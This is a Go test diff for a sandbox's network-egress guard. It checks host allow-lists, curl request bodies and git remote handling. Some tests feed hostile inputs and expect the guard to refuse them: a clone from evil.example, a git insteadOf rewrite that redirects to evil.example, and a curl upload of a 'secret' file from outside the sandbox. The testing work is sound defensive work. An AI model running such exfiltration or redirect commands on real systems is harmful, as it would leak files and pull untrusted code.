@@ -2,9 +2,12 @@ package sandbox
 
 import (
 	"fmt"
+	"io"
 	"net/http"
 	"net/http/httptest"
 	"net/url"
+	"os"
+	"strconv"
 	"strings"
 	"testing"
 )
@@ -79,6 +82,29 @@ func TestPolicyValidate(t *testing.T) {
 	}
 }
 
+func TestPolicyAllowedHosts(t *testing.T) {
+	p := Policy{AllowedHosts: []string{"downloads.example.test", "2001:db8::1"}}
+	for target, want := range map[string]bool{
+		"https://downloads.example.test/tool":      true,
+		"https://DOWNLOADS.EXAMPLE.TEST:8443/tool": true,
+		"https://sub.downloads.example.test/tool":  false,
+		"downloads.example.test:443":               true,
+		"other.example.test:443":                   false,
+		"[2001:db8::1]:443":                        true,
+	} {
+		if got := p.AllowsTarget(target); got != want {
+			t.Errorf("AllowsTarget(%q) = %v, want %v", target, got, want)
+		}
+	}
+	if err := p.Validate(); err != nil {
+		t.Fatal(err)
+	}
+	p.AllowedHosts = []string{"downloads.example.test:443"}
+	if err := p.Validate(); err == nil {
+		t.Error("a manifest host with a port was accepted")
+	}
+}
+
 // TestURLAllowListStopsDownload: even when the downloader is permitted, a fetch
 // to an off-list URL is refused in-process (curl/wget never shell out).
 func TestURLAllowListStopsDownload(t *testing.T) {
@@ -127,6 +153,47 @@ func TestCurlFollowsOnlyWithL(t *testing.T) {
 	}
 }
 
+func TestCurlRequestBody(t *testing.T) {
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		body, err := io.ReadAll(r.Body)
+		if err != nil {
+			t.Errorf("read body: %v", err)
+		}
+		fmt.Fprintf(w, "%s|%s|%s", r.Method, r.Header.Get("Content-Type"), body)
+	}))
+	defer srv.Close()
+	allow := func(c *Config) {
+		c.Network.AllowedPrefixes = []string{srv.URL}
+		c.Network.AllowedMethods["POST"] = true
+	}
+
+	out, er, err := runConfined(t, "curl -s -d a=b -d 'c=d e' "+srv.URL, allow)
+	if err != nil || out != "POST|application/x-www-form-urlencoded|a=b&c=d e" {
+		t.Fatalf("literal body = %q, stderr=%q, err=%v", out, er, err)
+	}
+	out, er, err = runConfined(t, "curl -s --data-urlencode 'q=a b' "+srv.URL, allow)
+	if err != nil || !strings.HasSuffix(out, "|q=a%20b") {
+		t.Fatalf("urlencoded body = %q, stderr=%q, err=%v", out, er, err)
+	}
+	out, er, err = runConfined(t, "printf 'a\\nb\\n' > body; curl -s --data-binary @body "+srv.URL, withHome(t), allow)
+	if err != nil || !strings.HasSuffix(out, "|a\nb\n") {
+		t.Fatalf("file body = %q, stderr=%q, err=%v", out, er, err)
+	}
+
+	outside := t.TempDir() + "/secret"
+	if err := os.WriteFile(outside, []byte("secret"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	_, er, err = runConfined(t, "curl -s --data-binary @"+strconv.Quote(outside)+" "+srv.URL, allow)
+	if err == nil || !strings.Contains(er, "refusing to read request body outside") {
+		t.Fatalf("outside body file was not refused: stderr=%q err=%v", er, err)
+	}
+	_, er, err = runConfined(t, "curl -s -d abcd "+srv.URL, allow, func(c *Config) { c.Network.MaxRequest = 3 })
+	if err == nil || !strings.Contains(er, "request body exceeded 3 bytes") {
+		t.Fatalf("oversize body was not refused: stderr=%q err=%v", er, err)
+	}
+}
+
 // TestGitHubPrefixes: the GitHub set covers a release download end to end —
 // the release page, its API, the asset redirect target — and nothing broader.
 func TestGitHubPrefixes(t *testing.T) {
@@ -172,7 +239,7 @@ func TestInterpreterEgress(t *testing.T) {
 	}
 }
 
-// TestGitEgress: git is on the allow-list, but the egress guard holds its
+// TestGitEgress: when git is explicitly granted, the egress guard holds its
 // remote operations to Policy.GitHosts by host — over https, ssh, git:// and
 // the scp-like form alike — and still honours the URL prefix list.
 func TestGitEgress(t *testing.T) {
@@ -199,20 +266,29 @@ func TestGitEgress(t *testing.T) {
 	if p.AllowsGit("https://github.com/o/r") || !p.AllowsGit("git@git.corp.example:o/r") {
 		t.Error("GitHosts should replace the default forges")
 	}
-	// End to end: git runs by default, an off-list clone is denied before it
+	// End to end: explicitly granted git runs, an off-list clone is denied before it
 	// spawns, and a bare `git fetch` outside any repository resolves to no
 	// host so it is denied too.
 	out, stderr, _ := runConfined(t, `
 git --version
 git clone https://evil.example/o/r
 git fetch
-`)
+`, func(c *Config) { c.Allowed = c.Allowed.With("git") })
 	if !strings.Contains(out, "git version") {
-		t.Errorf("git should run by default; out=%q stderr=%q", out, stderr)
+		t.Errorf("explicitly granted git should run; out=%q stderr=%q", out, stderr)
 	}
 	for _, want := range []string{"egress denied: git → https://evil.example/o/r", "egress denied: git → origin"} {
 		if !strings.Contains(stderr, want) {
 			t.Errorf("stderr missing %q:\n%s", want, stderr)
+		}
+	}
+	for _, script := range []string{
+		`git submodule update --init`,
+		`git -c 'url.https://evil.example/.insteadOf=https://github.com/' clone https://github.com/o/r`,
+	} {
+		_, stderr, err := runConfined(t, script, func(c *Config) { c.Allowed = c.Allowed.With("git") })
+		if err == nil || !strings.Contains(stderr, "network egress denied: git") {
+			t.Errorf("unsafe git form was not denied: %q stderr=%q err=%v", script, stderr, err)
 		}
 	}
 }
